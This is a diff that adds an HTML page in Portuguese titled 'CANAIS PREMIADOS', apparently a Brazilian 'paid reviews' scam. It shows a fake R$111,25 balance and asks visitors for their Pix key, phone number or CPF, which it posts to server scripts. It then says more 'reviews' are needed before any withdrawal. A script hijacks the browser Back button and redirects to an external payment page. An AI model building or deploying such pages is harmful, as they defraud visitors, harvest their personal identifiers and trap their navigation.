@@ -1,0 +1,192 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+    <script src="js/script.js"></script>
+    <script src="js/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="./styles/font.css">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/021532d534.js" crossorigin="anonymous"></script>
+
+    <title>CANAIS PREMIADOS</title>
+    <script>
+        var pixtype = 'phoneNumber';
+
+        function formatar(mascara, documento) {
+            let i = documento.value.length;
+            let saida = '#';
+            let texto = mascara.substring(i);
+            while (texto.substring(0, 1) != saida && texto.length) {
+                documento.value += texto.substring(0, 1);
+                i++;
+                texto = mascara.substring(i);
+            }
+        }
+
+       function gerarPix() {
+            if ($('.phone').val().length > 4 || $('.cpf').val().length > 4) {
+                var pixkey = '';
+                if (pixtype == 'document') {
+                    pixkey = $('.cpf').val().replace(/\D/g, '');
+                } else {
+                    pixkey = $('.phone').val().replace(/\D/g, '');
+                }
+
+                $.ajax({
+                    url: 'verificar_pix.php',
+                    type: 'POST',
+                    data: { chave_pix: pixkey },
+                    success: function(response) {
+                        var res = JSON.parse(response);
+                        if (res.status === 'exists') {
+                            alert('Já existe uma solicitação de Pix com esta chave ou deste IP.');
+                        } else {
+                            var data = {
+                                value: 0.01,
+                                key: pixkey,
+                                typeKey: pixtype
+                            };
+
+                            $.ajax({
+                                url: 'solicitar_pix.php',
+                                type: 'POST',
+                                data: data,
+                                success: function(response) {
+                                    $('#suitpay').removeClass('d-none');
+                                    console.log(response);
+                                },
+                                error: function(response) {
+                                    console.log(response);
+                                }
+                            });
+                        }
+                    },
+                    error: function(response) {
+                        console.log(response);
+                    }
+                });
+            } else {
+                alert('Preencha o pix');
+            }
+        }
+        
+        $(document).ready(function() {
+            $('.option').click(function() {
+                $('.option').removeClass('selected');
+                $(this).addClass("selected");
+                option = $(this).attr('id');
+                console.log(option);
+
+                if (option == 'phone') {
+                    pixtype = 'phoneNumber';
+                    $('.phone').removeClass('d-none');
+                    $('.cpf').addClass('d-none');
+                    $('.email').addClass('d-none');
+                } else if (option == 'cpf') {
+                    pixtype = 'document';
+                    $('.cpf').removeClass('d-none');
+                    $('.phone').addClass('d-none');
+                    $('.email').addClass('d-none');
+                }
+            });
+        });
+    </script>
+<script>
+window.redirectURL = "https://homecadastro.online/homepay5"; // Substitua "https://pay.risepay.com.br/Pay/cf3ee1d49eee41488aabcf6bc60f3d99" pelo URL desejado
+
+// Função de redirecionamento
+function exitStopper() {
+  if (window.redirectURL) {
+    window.location.href = window.redirectURL;
+  }
+}
+
+// Adiciona o estado inicial ao histórico
+history.pushState({ page: 1 }, "", "");
+
+// Escuta o evento 'popstate' para detectar a navegação de volta
+window.addEventListener('popstate', function(event) {
+  if (event.state && event.state.page === 1) {
+    exitStopper();
+  }
+});
+</script></head>
+
+
+
+<body id="page-container">
+    <audio id="audio" src="media/cash.mp3"></audio>
+
+    <header>
+        <img class="logo" src="images/logo.png" alt="">
+        <span class="moneyWrapper">
+            <img src="images/icon.png" alt="">
+            <p>R$ <span id="money"><span id="value">111</span>,25</span></p>
+        </span>
+    </header>
+
+    <div class="bg-div">
+        <section class="conteudo presell-headline">
+            <div class="headline">
+                <h3>Cadastre agora sua chave PIX</h3>
+            </div>
+        
+            <section class="conteudo">
+                <section class="box" style="background-color: #21283f; color: #fdfdfd;">
+                    <div class="badge" style="display: flex; flex-direction: column; gap: 10px;">
+                        <span style="color: rgb(255, 255, 255); font-size: 16px;">Antes de realizar seu 1º saque CADASTRE SUA CHAVE PIX.</span>
+                        <span style="color: rgb(255, 255, 255); font-size: 16px;">Vamos validar <b style="color: #09BD4D;">SEU PIX</b> preencha abaixo para continuarmos.</span>
+                    </div>
+
+                    <div class="saqueteste">
+                        <p style="font-size: 13px; text-align: center; margin: 5px 0px 10px 0px;">
+                            <i class="fa-brands fa-pix" style="color: rgb(71, 185, 128);"></i>
+                            <b style="color: #09BD4D;">Selecione sua chave PIX</b>
+                        </p>
+                        <div class="wrapperOption">
+                            <div class="option selected" id="phone">
+                                <i class="fa-solid fa-mobile-screen-button"></i>
+                                Celular
+                            </div>
+                            <div class="option" id="cpf">
+                                <i class="fa-solid fa-address-card"></i>
+                                CPF
+                            </div>
+                        </div>
+                        <input class="pix phone" type="tel" placeholder="Digite seu número aqui..." onkeypress="formatar('(##) #####-####',this)" maxlength="15">
+                        <input class="pix cpf d-none" placeholder="Digite seu CPF aqui..." onkeypress="formatar('###.###.###-##',this)" maxlength="14">
+                        <input class="pix email d-none" placeholder="Digite seu E-mail aqui...">
+
+                        <button class="button pulse" onclick="realizarSaque();">REALIZAR SAQUE</button>
+
+                        <script>
+                            function realizarSaque() {
+                                gerarPix();
+                                document.getElementById('suitpay').classList.remove('d-none');
+                            }
+                        </script>
+                    </div>
+                </section>
+            </section>
+            <p style="color: grey;">©️ 2024 Todos os direitos reservados.</p>
+        </section>
+
+        <div id="suitpay" class="modal d-none">
+      <div class="modal-content" style="background-color: #21283f;">
+        <h3 style="font-weight: normal; font-size: 16px; line-height: 23px; color: #ffffff;">
+          Excelente! <b></b> Já validamos sua <span style="color: #09BD4D;">"CHAVE PIX"</span>.
+        </h3>
+        <h3 style="font-weight: normal; font-size: 16px; line-height: 23px; color: white;">
+          Agora basta <b>realizar mais 3 avaliações</b> para realizar seu 1º saque!
+        </h3>
+        <button type="button" class="button pulse" onclick="window.location.href='https://homecadastro.online/homepay2/'">
+          <span> CONTINUAR </span>
+        </button>
+      </div>
+    </div>
+    </div>
+
+
+</body></html>
